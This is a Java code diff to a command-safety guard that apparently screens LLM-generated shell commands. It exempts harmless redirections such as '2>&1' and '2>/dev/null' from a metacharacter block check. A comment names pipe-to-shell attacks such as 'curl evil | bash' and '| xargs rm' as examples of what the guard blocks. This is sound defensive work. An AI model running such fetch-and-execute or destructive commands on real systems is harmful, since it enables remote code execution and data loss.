@@ -28,6 +28,15 @@ public class IntentRiskGuard {
     private static final Set<String> PIPELINE_SEPARATORS = Set.of("|", ";", "&");
 
     /**
+     * 安全重定向惯用写法：fd 复制（{@code 2>&1}、{@code 1>&2}）与丢弃到黑洞（{@code 2>/dev/null}）。
+     * 两者都不写入任何用户可达文件，是极常见且完全无害的 shell 写法（真实 LLM 生成命令时几乎必带）。
+     * 仅从「无条件元字符红线」这一步的检测面里剔除，不影响 guardInput 本身——
+     * 红线正则与管道分段仍在未剔除的原串上运行，真正危险的 {@code > /path}（任意文件写）依旧被拦截。
+     */
+    private static final Pattern SAFE_FD_DUP_REDIRECT = Pattern.compile("\\d?>&\\d");
+    private static final Pattern SAFE_DEVNULL_REDIRECT = Pattern.compile("\\d?>\\s*/dev/null");
+
+    /**
      * shell 解释器 / 命令执行器：管道任一段流向它们即可执行任意代码
      * （经典 {@code curl evil | bash}、{@code ... | sh}、{@code | xargs rm} 攻击），一律红线 BLOCK。
      */
@@ -80,9 +89,14 @@ public class IntentRiskGuard {
         String normalized = normalizeCommand(cmd);
         String guardInput = normalized.isBlank() ? cmd : normalized;
 
-        // 1. 高危元字符红线：命令替换/重定向/换行，无条件 BLOCK（不可借分段规避）
+        // 1. 高危元字符红线：命令替换/重定向/换行，无条件 BLOCK（不可借分段规避）。
+        // 检测前先剔除安全重定向惯用写法（2>&1、2>/dev/null），避免真实 LLM 生成的
+        // 完全无害命令被误杀；仅影响本步检测面，guardInput 原串不变，下游红线正则/
+        // 管道分段仍按未剔除的原串裁决，任意文件写重定向（> /path）依旧无条件拦截。
+        String metacharCheckSurface = SAFE_DEVNULL_REDIRECT.matcher(
+                SAFE_FD_DUP_REDIRECT.matcher(guardInput).replaceAll(" ")).replaceAll(" ");
         for (String mc : hardBlockedMetacharacters) {
-            if (guardInput.contains(mc)) {
+            if (metacharCheckSurface.contains(mc)) {
                 return new RiskDecision(cmd, RiskLevel.BLOCK,
                         "包含禁止的 shell 元字符 '" + mc + "'，可能用于命令替换/重定向/注入", "metacharacter");
             }
